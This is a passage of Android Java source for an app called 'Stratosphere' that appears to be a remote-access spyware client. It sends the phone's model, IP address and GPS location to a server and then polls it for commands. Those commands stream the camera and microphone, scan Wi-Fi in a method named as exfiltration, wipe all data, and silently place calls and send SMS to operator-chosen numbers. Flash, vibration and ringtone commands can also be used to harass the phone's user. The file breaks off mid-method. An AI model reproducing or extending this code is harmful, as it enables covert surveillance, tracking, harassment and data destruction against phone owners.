package com.example.mulitple;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioRecord;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.speech.tts.TextToSpeech;
import android.text.format.Formatter;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Semaphore;

import okhttp3.OkHttpClient;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "Stratosphere";
    private static final int ALL_PERMISSIONS_REQUEST_CODE = 200;
    private static final int POLLING_INTERVAL_MS = 5000;
    private static final int STREAM_PORT = 8080;
    private static final String CHANNEL_ID = "STRATOSPHERE_NOTIFS";

    // ══════════════════════════════════════════════════════
    //  URL SERVEUR PRINCIPAL — MODIFIER ICI SI BESOIN
    // ══════════════════════════════════════════════════════
    private static final String SERVER_BASE_URL = "http://192.168.1.107/stratosphere/php";
    private static final String WSS_SERVER_URL  = "wss://192.168.1.107:8443";

    private android.webkit.WebView webRtcWebView;

    private EditText brandNameEdt, modelNameEdt, modelOsEdt, batteryLevelEdt,
            connectTypeEdt, boardHardwareEdt, latitudeEdt, longitudeEdt;
    private android.widget.Button btnLive, btnStopLive;

    private String deviceId = "";
    private Location currentLocation;
    private String deviceIp = "0.0.0.0";

    private CameraManager cameraManager;
    private String cameraId;
    private boolean isFlashOn = false;

    private WebSocket systemWebSocket;
    private TextToSpeech textToSpeech;

    // Stroboscope
    private final Handler stroboHandler = new Handler(Looper.getMainLooper());
    private boolean isStroboRunning = false;
    private int STROBO_INTERVAL_MS = 200;
    private final Runnable stroboRunnable = new Runnable() {
        @Override
        public void run() {
            if (isFlashOn) { turnFlashOffSilent(); } else { turnFlashOnSilent(); }
            stroboHandler.postDelayed(this, STROBO_INTERVAL_MS);
        }
    };

    // Vibreur
    private Vibrator vibrator;
    private final Handler vibrateHandler = new Handler(Looper.getMainLooper());
    private boolean isVibrateRunning = false;
    private final int VIBRATE_DURATION = 400;
    private final int VIBRATE_INTERVAL = 1000;
    private final Runnable vibrateRunnable = new Runnable() {
        @Override
        public void run() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(VIBRATE_DURATION, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(VIBRATE_DURATION);
            }
            vibrateHandler.postDelayed(this, VIBRATE_INTERVAL);
        }
    };

    private Ringtone ringtone;
    private boolean isRingtonePlaying = false;

    // Streaming MJPEG (ancien — conservé pour compatibilité)
    private CameraDevice streamCameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private Size imageDimension;
    private StreamConfigurationMap map;
    private boolean isStreaming = false;
    private ServerSocket serverSocket;
    private Thread streamThread;
    private final Semaphore cameraLock = new Semaphore(1);
    private byte[] latestFrame = new byte[0];

    // ══════════════════════════════════════════════════════
    //  MICRO STREAMING via WebSocket (réutilise server3.js:8443)
    // ══════════════════════════════════════════════════════
    private WebSocket audioWebSocket;
    private AudioRecord audioRecord;
    private boolean isMicStreaming = false;
    private Thread micStreamThread;

    // ══════════════════════════════════════════════════════
    //  MOTION TRAP — Capteur accéléromètre
    // ══════════════════════════════════════════════════════
    private SensorManager sensorManager;
    private Sensor accelerometer;
    private Sensor proximitySensor;
    private boolean isMotionTrapActive = false;
    private boolean isProximityActive = false;
    private float lastAccelX = 0, lastAccelY = 0, lastAccelZ = 0;
    private boolean motionInitialized = false;
    private static final float MOTION_THRESHOLD = 3.0f;

    private final SensorEventListener motionTrapListener = new SensorEventListener() {
        @Override
        public void onSensorChanged(SensorEvent event) {
            if (!isMotionTrapActive) return;
            float x = event.values[0];
            float y = event.values[1];
            float z = event.values[2];

            if (!motionInitialized) {
                lastAccelX = x; lastAccelY = y; lastAccelZ = z;
                motionInitialized = true;
                return;
            }

            float deltaX = Math.abs(x - lastAccelX);
            float deltaY = Math.abs(y - lastAccelY);
            float deltaZ = Math.abs(z - lastAccelZ);

            if (deltaX > MOTION_THRESHOLD || deltaY > MOTION_THRESHOLD || deltaZ > MOTION_THRESHOLD) {
                Log.d(TAG, "MOTION TRAP TRIGGERED! delta=" + (deltaX + deltaY + deltaZ));
                onMotionTrapTriggered();
            }
            lastAccelX = x; lastAccelY = y; lastAccelZ = z;
        }

        @Override
        public void onAccuracyChanged(Sensor sensor, int accuracy) {}
    };

    // ══════════════════════════════════════════════════════
    //  PROXIMITY TRIGGER — Capteur de proximité
    // ══════════════════════════════════════════════════════
    private final SensorEventListener proximityListener = new SensorEventListener() {
        @Override
        public void onSensorChanged(SensorEvent event) {
            if (!isProximityActive) return;
            float distance = event.values[0];
            float maxRange = event.sensor.getMaximumRange();

            if (distance < maxRange) {
                Log.d(TAG, "PROXIMITY TRIGGERED! distance=" + distance);
                onProximityTriggered();
            }
        }

        @Override
        public void onAccuracyChanged(Sensor sensor, int accuracy) {}
    };

    // ══════════════════════════════════════════════════════
    //  AUDIO TRACK — MediaPlayer pour piste son réelle
    // ══════════════════════════════════════════════════════
    private MediaPlayer activeMediaPlayer;

    // ══════════════════════════════════════════════════════
    //  TABLE MORSE COMPLÈTE
    // ══════════════════════════════════════════════════════
    private static final Map<Character, String> MORSE_MAP = new HashMap<>();
    static {
        MORSE_MAP.put('A', ".-");     MORSE_MAP.put('B', "-...");   MORSE_MAP.put('C', "-.-.");
        MORSE_MAP.put('D', "-..");    MORSE_MAP.put('E', ".");      MORSE_MAP.put('F', "..-.");
        MORSE_MAP.put('G', "--.");    MORSE_MAP.put('H', "....");   MORSE_MAP.put('I', "..");
        MORSE_MAP.put('J', ".---");   MORSE_MAP.put('K', "-.-");    MORSE_MAP.put('L', ".-..");
        MORSE_MAP.put('M', "--");     MORSE_MAP.put('N', "-.");     MORSE_MAP.put('O', "---");
        MORSE_MAP.put('P', ".--.");   MORSE_MAP.put('Q', "--.-");   MORSE_MAP.put('R', ".-.");
        MORSE_MAP.put('S', "...");    MORSE_MAP.put('T', "-");      MORSE_MAP.put('U', "..-");
        MORSE_MAP.put('V', "...-");   MORSE_MAP.put('W', ".--");    MORSE_MAP.put('X', "-..-");
        MORSE_MAP.put('Y', "-.--");   MORSE_MAP.put('Z', "--..");
        MORSE_MAP.put('0', "-----");  MORSE_MAP.put('1', ".----");  MORSE_MAP.put('2', "..---");
        MORSE_MAP.put('3', "...--");  MORSE_MAP.put('4', "....-");  MORSE_MAP.put('5', ".....");
        MORSE_MAP.put('6', "-....");  MORSE_MAP.put('7', "--...");  MORSE_MAP.put('8', "---..");
        MORSE_MAP.put('9', "----.");
    }

    // Volley Polling
    private RequestQueue requestQueue;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable pollingRunnable = new Runnable() {
        @Override
        public void run() {
            checkServerCommand();
            handler.postDelayed(this, POLLING_INTERVAL_MS);
        }
    };

    private LocationManager locationManager;
    private final LocationListener locationListener = new LocationListener() {
        @Override
        public void onLocationChanged(@NonNull Location location) {
            currentLocation = location;
            updateLocationUI();
        }
    };

    // ══════════════════════════════════════════════════════════════
    //  LIFECYCLE
    // ══════════════════════════════════════════════════════════════

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initViews();
        requestQueue = Volley.newRequestQueue(this);

        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        sensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
        accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        proximitySensor = sensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY);

        // Init TTS Engine
        textToSpeech = new TextToSpeech(this, status -> {
            if (status == TextToSpeech.SUCCESS) {
                textToSpeech.setLanguage(Locale.FRANCE);
            }
        });

        findFlashCamera();
        loadDeviceIdFromPrefs();
        collectAndDisplayDeviceInfo();
        getDeviceIpAddress();
        startBackgroundThread();
        createNotificationChannel();

        checkAndRequestAllPermissions();

        handler.postDelayed(pollingRunnable, 2000);
        startRemoteControlListener();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopStroboscope();
        stopVibration();
        stopRingtone();
        stopWebRTCLiveEngine();
        stopMicStreaming();
        stopMotionTrap();
        stopProximityTrigger();
        stopActiveMediaPlayer();
        turnFlashOffSilent();
        stopBackgroundThread();
        handler.removeCallbacks(pollingRunnable);
        if (textToSpeech != null) { textToSpeech.stop(); textToSpeech.shutdown(); }
        if (systemWebSocket != null) { systemWebSocket.close(1000, "Détruit"); }
        if (audioWebSocket != null) { audioWebSocket.close(1000, "Détruit"); }
        if (locationManager != null) { locationManager.removeUpdates(locationListener); }
    }

    // ══════════════════════════════════════════════════════════════
    //  PERMISSIONS
    // ══════════════════════════════════════════════════════════════

    private void checkAndRequestAllPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        String[] required = {
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.SEND_SMS
        };
        for (String perm : required) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(perm);
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS);
            }
        }
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), ALL_PERMISSIONS_REQUEST_CODE);
        } else {
            startLocationUpdates();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == ALL_PERMISSIONS_REQUEST_CODE) {
            startLocationUpdates();
        }
    }

    // ══════════════════════════════════════════════════════════════
    //  INIT VIEWS
    // ══════════════════════════════════════════════════════════════

    private void initViews() {
        brandNameEdt = findViewById(R.id.idEdtBrandName);
        modelNameEdt = findViewById(R.id.idEdtModelName);
        modelOsEdt = findViewById(R.id.idEdtModelOs);
        batteryLevelEdt = findViewById(R.id.idEdtBatteryLevel);
        connectTypeEdt = findViewById(R.id.idEdtConnectType);
        boardHardwareEdt = findViewById(R.id.idEdtBoardHardware);
        latitudeEdt = findViewById(R.id.idEdtnLatitude);
        longitudeEdt = findViewById(R.id.idEdtnLongitude);
        btnLive = findViewById(R.id.btnLive);
        btnStopLive = findViewById(R.id.btnStopLive);

        btnLive.setOnClickListener(v -> {
            isStreaming = true;
            btnLive.setVisibility(android.view.View.GONE);
            btnStopLive.setVisibility(android.view.View.VISIBLE);
            startWebRTCLiveEngine(deviceId.isEmpty() ? Build.MODEL : deviceId);
        });

        btnStopLive.setOnClickListener(v -> {
            isStreaming = false;
            btnStopLive.setVisibility(android.view.View.GONE);
            btnLive.setVisibility(android.view.View.VISIBLE);
            stopWebRTCLiveEngine();
        });
    }

    // ══════════════════════════════════════════════════════════════
    //  DEVICE INFO
    // ══════════════════════════════════════════════════════════════

    private void collectAndDisplayDeviceInfo() {
        brandNameEdt.setText(Build.MANUFACTURER);
        modelNameEdt.setText(Build.MODEL);
        modelOsEdt.setText("Android " + Build.VERSION.RELEASE);
        batteryLevelEdt.setText(getBatteryPercentage() + "%");
        connectTypeEdt.setText(getConnectionType());
        boardHardwareEdt.setText(Build.BOARD);
        updateLocationUI();
    }

    private String getBatteryPercentage() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        if (bm != null) {
            return String.valueOf(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
        }
        return "N/A";
    }

    private String getConnectionType() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && cm != null) {
            NetworkCapabilities caps = cm.getNetworkCapabilities(cm.getActiveNetwork());
            if (caps == null) return "Aucune";
            if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) return "WiFi";
            if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) return "Mobile";
        }
        return "Inconnu";
    }

    @SuppressLint("MissingPermission")
    private void getDeviceIpAddress() {
        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifiManager != null) {
            int ipAddress = wifiManager.getConnectionInfo().getIpAddress();
            deviceIp = Formatter.formatIpAddress(ipAddress);
        }
        if (deviceIp.equals("0.0.0.0")) deviceIp = "Non connecté WiFi";
    }

    private void findFlashCamera() {
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Boolean flashAvailable = chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (flashAvailable != null && flashAvailable) {
                    cameraId = id;
                    break;
                }
            }
        } catch (Exception e) {
            cameraId = null;
        }
    }

    // ══════════════════════════════════════════════════════════════
    //  LOCATION
    // ══════════════════════════════════════════════════════════════

    @SuppressWarnings("MissingPermission")
    private void startLocationUpdates() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 5, locationListener);
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 5, locationListener);
            Location last = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (last == null) last = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (last != null) {
                currentLocation = last;
                updateLocationUI();
            }
            if (deviceId.isEmpty()) { waitForFirstLocationAndRegister(); }
        } else {
            latitudeEdt.setText("GPS désactivé");
            longitudeEdt.setText("GPS désactivé");
            if (deviceId.isEmpty()) { sendDeviceDataToServer(); }
        }
    }

    private void waitForFirstLocationAndRegister() {
        final Handler locationHandler = new Handler(Looper.getMainLooper());
        final Runnable checkLocation = new Runnable() {
            int attempts = 0;
            @Override
            public void run() {
                if (currentLocation != null && deviceId.isEmpty()) {
                    sendDeviceDataToServer();
                } else if (attempts < 30) {
                    attempts++;
                    locationHandler.postDelayed(this, 1000);
                } else if (deviceId.isEmpty()) {
                    sendDeviceDataToServer();
                }
            }
        };
        locationHandler.postDelayed(checkLocation, 1000);
    }

    private void updateLocationUI() {
        if (currentLocation != null) {
            latitudeEdt.setText(String.format(Locale.US, "%.6f", currentLocation.getLatitude()));
            longitudeEdt.setText(String.format(Locale.US, "%.6f", currentLocation.getLongitude()));
        } else {
            latitudeEdt.setText("En attente...");
            longitudeEdt.setText("En attente...");
        }
    }

    // ══════════════════════════════════════════════════════════════
    //  SERVER REGISTRATION
    // ══════════════════════════════════════════════════════════════

    private void sendDeviceDataToServer() {
        getDeviceIpAddress();
        String url = SERVER_BASE_URL + "/create.php";
        StringRequest request = new StringRequest(Request.Method.POST, url,
                response -> {
                    String newId = response.trim();
                    if (!newId.equals("Error") && !newId.isEmpty() && !newId.equals(deviceId)) {
                        deviceId = newId;
                        saveDeviceIdToPrefs(deviceId);
                        if (systemWebSocket != null) { systemWebSocket.close(1000, "Nouvel ID obtenu"); }
                        startRemoteControlListener();
                    }
                },
                error -> Log.e(TAG, "Erreur réseau", error)) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> params = new HashMap<>();
                params.put("brandName", Build.MANUFACTURER);
                params.put("modelName", Build.MODEL);
                params.put("modelOs", "Android " + Build.VERSION.RELEASE);
                params.put("batteryLevel", getBatteryPercentage());
                params.put("connectType", getConnectionType());
                params.put("boardHardware", Build.BOARD);
                params.put("latitude", currentLocation != null ? String.valueOf(currentLocation.getLatitude()) : "0");
                params.put("longitude", currentLocation != null ? String.valueOf(currentLocation.getLongitude()) : "0");
                params.put("ip_address", deviceIp);
                return params;
            }
        };
        requestQueue.add(request);
    }

    // ══════════════════════════════════════════════════════════════════
    //  COMMAND POLLING — BLOC PRINCIPAL DE ROUTAGE DES COMMANDES
    // ══════════════════════════════════════════════════════════════════

    private void checkServerCommand() {
        if (deviceId.isEmpty()) return;
        String url = SERVER_BASE_URL + "/read.php?id=" + deviceId;

        StringRequest request = new StringRequest(Request.Method.GET, url,
                response -> {
                    if (response == null) return;
                    String rawCommand = response.trim();
                    String commandUpper = rawCommand.toUpperCase();
                    if (commandUpper.isEmpty() || commandUpper.equals("NONE")) return;

                    Log.d(TAG, "Commande reçue du serveur : " + rawCommand);

                    // ─────────────────────────────────────────────────
                    //  1. COMMANDES SIMPLES (sans arguments)
                    // ─────────────────────────────────────────────────
                    if (commandUpper.equals("FLASH")) {
                        if (!isFlashOn) turnFlashOnSilent();

                    } else if (commandUpper.equals("NOFLASH")) {
                        turnFlashOffSilent();

                    } else if (commandUpper.equals("STROBO")) {
                        if (!isStroboRunning) startStroboscope(200);

                    } else if (commandUpper.equals("NOSTROBO")) {
                        stopStroboscope();

                    } else if (commandUpper.equals("VIBRATE")) {
                        if (!isVibrateRunning) startVibration();

                    } else if (commandUpper.equals("STOPVIBRATE")) {
                        stopVibration();

                    } else if (commandUpper.equals("RING")) {
                        if (!isRingtonePlaying) startRingtone();

                    } else if (commandUpper.equals("STOPRING")) {
                        stopRingtone();

                    } else if (commandUpper.equals("LOCALISATION")) {
                        startLocationUpdates();

                    } else if (commandUpper.equals("SCREEN_LOCK")) {
                        executeScreenLock();

                    } else if (commandUpper.equals("WIPE_DATA")) {
                        executeEmergencyWipe();

                    } else if (commandUpper.equals("WIFI_SCAN")) {
                        executeWifiScanExfil();

                    } else if (commandUpper.equals("LIVE")) {
                        if (!isStreaming) { isStreaming = true; startWebRTCLiveEngine(deviceId); }

                    } else if (commandUpper.equals("STOPLIVE")) {
                        if (isStreaming) { stopWebRTCLiveEngine(); }

                        // ─────────────────────────────────────────────────
                        //  [FIX] STROBO COMBO — stroboscope + vibration + sonnerie
                        // ─────────────────────────────────────────────────
                    } else if (commandUpper.equals("STROBO_COMBO_ON")) {
                        startStroboscope(100);
                        startVibration();
                        startRingtone();

                    } else if (commandUpper.equals("STROBO_COMBO_OFF")) {
                        stopStroboscope();
                        stopVibration();
                        stopRingtone();

                        // ─────────────────────────────────────────────────
                        //  [FIX] MOTION TRAP — capteur accéléromètre réel
                        // ─────────────────────────────────────────────────
                    } else if (commandUpper.equals("MOTION_TRAP_ON")) {
                        startMotionTrap();

                    } else if (commandUpper.equals("MOTION_TRAP_OFF")) {
                        stopMotionTrap();

                        // ─────────────────────────────────────────────────
                        //  [FIX] PROXIMITY TRIGGER — capteur proximité réel
                        // ─────────────────────────────────────────────────
                    } else if (commandUpper.equals("PROXIMITY_ON")) {
                        startProximityTrigger();

                    } else if (commandUpper.equals("PROXIMITY_OFF")) {
                        stopProximityTrigger();

                        // ─────────────────────────────────────────────────
                        //  [FIX] MICRO STREAMING via WebSocket (server3.js)
                        // ─────────────────────────────────────────────────
                    } else if (commandUpper.equals("MICRO")) {
                        if (!isMicStreaming) startMicStreaming();

                    } else if (commandUpper.equals("STOPMICRO")) {
                        stopMicStreaming();

                        // ─────────────────────────────────────────────────
                        //  2. COMMANDES AVEC ARGUMENTS (séparateur ":")
                        // ─────────────────────────────────────────────────

                        // [FIX] TTS — TEXT2SPEACH:texte
                    } else if (commandUpper.startsWith("TEXT2SPEACH:")) {
                        if (rawCommand.length() > 12) {
                            String argument = rawCommand.substring(12).trim();
                            executeTextToSpeech(argument);
                        }

                        // [FIX] MORSE — MORSE:texte (avec vraie table de conversion)
                    } else if (commandUpper.startsWith("MORSE:")) {
                        if (rawCommand.length() > 6) {
                            String argument = rawCommand.substring(6).trim();
                            executeMorseLight(argument);
                        }

                        // [FIX] PLAYAUDIO — PLAYAUDIO:fichier.mp3 (vrai MediaPlayer)
                    } else if (commandUpper.startsWith("PLAYAUDIO:")) {
                        if (rawCommand.length() > 10) {
                            String argument = rawCommand.substring(10).trim();
                            executePlayAudioTrack(argument);
                        }

                        // [FIX] FULL GLOW — FULL_GLOW:#hexcolor
                    } else if (commandUpper.startsWith("FULL_GLOW:")) {
                        if (rawCommand.length() > 10) {
                            String argument = rawCommand.substring(10).trim();
                            executeFullGlowHex(argument);
                        }

                        // [FIX] INJECT_CALL — séparateur ">" aligné avec le panel
                    } else if (commandUpper.startsWith("INJECT_CALL:")) {
                        if (rawCommand.length() > 12) {
                            String content = rawCommand.substring(12).trim();
                            // Le panel envoie: numero>corps  (le corps est ignoré pour un appel)
                            String[] parts = content.split(">");
                            if (parts.length > 0) executeOutboundCall(parts[0].trim());
                        }

                        // [FIX] INJECT_SMS — séparateur ">" aligné avec le panel
                    } else if (commandUpper.startsWith("INJECT_SMS:")) {
                        if (rawCommand.length() > 11) {
                            String content = rawCommand.substring(11).trim();
                            // Le panel envoie: numero>message
                            String[] parts = content.split(">");
                            if (parts.length > 1) {
                                executeOutboundSMS(parts[0].trim(), parts[1].trim());
                            }
                        }

                        // [FIX] INJECT_MAIL — nouveau handler
                    } else if (commandUpper.startsWith("INJECT_MAIL:")) {
                        if (rawCommand.length() > 12) {
                            String content = rawCommand.substring(12).trim();
                            // Le panel envoie: email>corps
                            String[] parts = content.split(">");
                            if (parts.length > 0) {
                                String email = parts[0].trim();
                                String body = parts.length > 1 ? parts[1].trim() : "";
                                executeInjectMail(email, body);
                            }
                        }

                        // [FIX] INJECT_TELEGRAM — nouveau handler
                    } else if (commandUpper.startsWith("INJECT_TELEGRAM:")) {
                        if (rawCommand.length() > 16) {
                            String content = rawCommand.substring(16).trim();
                            // Le panel envoie: chatId>message
                            String[] parts = content.split(">");
                            if (parts.length > 0) {
                                String chatId = parts[0].trim();
                                String body = parts.length > 1 ? parts[1].trim() : "";
                                executeInjectTelegram(chatId, body);
                            }
                        }

                    } else {
                        Log.w(TAG, "Commande inconnue ignorée: " + rawCommand);
                    }
                },
                error -> Log.e(TAG, "Erreur polling réseau Volley", error));

        requestQueue.add(request);
    }

    // ══════════════════════════════════════════════════════════════════
    //  IMPLEMENTATIONS DES COMMANDES
    // ══════════════════════════════════════════════════════════════════

    // ── TTS ──────────────────────────────────────────────────────────
    private void executeTextToSpeech(String text) {
        if (textToSpeech != null) {
            textToSpeech.speak(text, TextToSpeech.QUEUE_FLUSH, null, "STRATO_TTS");
        }
    }

    // ── MORSE (CORRIGÉ — avec vraie table de conversion) ────────────
    private void executeMorseLight(String text) {
        Handler h = new Handler(Looper.getMainLooper());
        long delay = 0;

        for (char letter : text.toUpperCase().toCharArray()) {
            if (letter == ' ') {
                delay += 1400; // pause inter-mots
                continue;
            }

            String code = MORSE_MAP.get(letter);
            if (code == null) continue;

            for (char symbol : code.toCharArray()) {
                long duration = (symbol == '-') ? 400 : 150;
                final long onAt = delay;
                final long offAt = delay + duration;
                h.postDelayed(this::turnFlashOnSilent, onAt);
                h.postDelayed(this::turnFlashOffSilent, offAt);
                delay = offAt + 200; // gap intra-symbole
            }
            delay += 400; // gap inter-lettres
        }
    }

    // ── AUDIO DECK (CORRIGÉ — vrai MediaPlayer depuis assets) ───────
    private void executePlayAudioTrack(String track) {
        stopActiveMediaPlayer();
        try {
            // Tente de lire depuis assets/audio/
            android.content.res.AssetFileDescriptor afd = getAssets().openFd("audio/" + track);
            activeMediaPlayer = new MediaPlayer();
            activeMediaPlayer.setDataSource(afd.getFileDescriptor(), afd.getStartOffset(), afd.getLength());
            afd.close();

            // Volume max
            AudioManager audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
            if (audioManager != null) {
                int maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0);
            }

            activeMediaPlayer.prepare();
            activeMediaPlayer.start();
            activeMediaPlayer.setOnCompletionListener(mp -> {
                mp.release();
                activeMediaPlayer = null;
            });
            Log.d(TAG, "Audio track playing: " + track);
        } catch (IOException e) {
            Log.e(TAG, "Fichier audio introuvable dans assets/audio/" + track + " — fallback sonnerie", e);
            startRingtone(); // fallback si le fichier n'existe pas
        }
    }

    private void stopActiveMediaPlayer() {
        if (activeMediaPlayer != null) {
            try {
                if (activeMediaPlayer.isPlaying()) activeMediaPlayer.stop();
                activeMediaPlayer.release();
            } catch (Exception ignored) {}
            activeMediaPlayer = null;
        }
    }

    // ── FULL GLOW (inchangé) ────────────────────────────────────────
    private void executeFullGlowHex(String hexColor) {
        runOnUiThread(() -> {
            try {
                getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                WindowManager.LayoutParams lp = getWindow().getAttributes();
                lp.screenBrightness = 1.0f;
                getWindow().setAttributes(lp);

                int color = android.graphics.Color.parseColor(hexColor.trim());
                findViewById(android.R.id.content).setBackgroundColor(color);
                Toast.makeText(this, "Glow Matrix Synced: " + hexColor, Toast.LENGTH_SHORT).show();
            } catch (Exception ignored) {}
        });
    }

    // ── WIFI SCAN ───────────────────────────────────────────────────
    @SuppressLint("MissingPermission")
    private void executeWifiScanExfil() {
        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifiManager != null) {
            wifiManager.startScan();
            List<ScanResult> results = wifiManager.getScanResults();
            Log.d(TAG, "Wi-Fi Scan exfiltrated package. Found size: " + results.size());
        }
    }

    // ── SCREEN LOCK ─────────────────────────────────────────────────
    private void executeScreenLock() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, DeviceAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            dpm.lockNow();
        } else {
            Toast.makeText(this, "Veuillez activer les permissions Device Admin.", Toast.LENGTH_LONG).show();
        }
    }

    // ── WIPE ────────────────────────────────────────────────────────
    private void executeEmergencyWipe() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, DeviceAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            dpm.wipeData(0);
        }
    }

    // ── INJECT CALL (corrigé) ───────────────────────────────────────
    @SuppressLint("MissingPermission")
    private void executeOutboundCall(String targetNumber) {
        try {
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + targetNumber.trim()));
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(callIntent);
        } catch (Exception e) {
            Log.e(TAG, "Échec appel sortant vers " + targetNumber, e);
        }
    }

    // ── INJECT SMS (CORRIGÉ — utilise directement les 2 params) ─────
    @SuppressLint("MissingPermission")
    private void executeOutboundSMS(String target, String body) {
        try {
            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
            smsManager.sendTextMessage(target, null, body, null, null);
            Log.d(TAG, "SMS envoyé à " + target);
        } catch (Exception e) {
            Log.e(TAG, "Échec de l'envoi SMS vers " + target, e);
        }
    }

    // ── INJECT MAIL (NOUVEAU) ───────────────────────────────────────
    private void executeInjectMail(String email, String body) {
        try {
            Intent mailIntent = new Intent(Intent.ACTION_SENDTO);
            mailIntent.setData(Uri.parse("mailto:" + email));
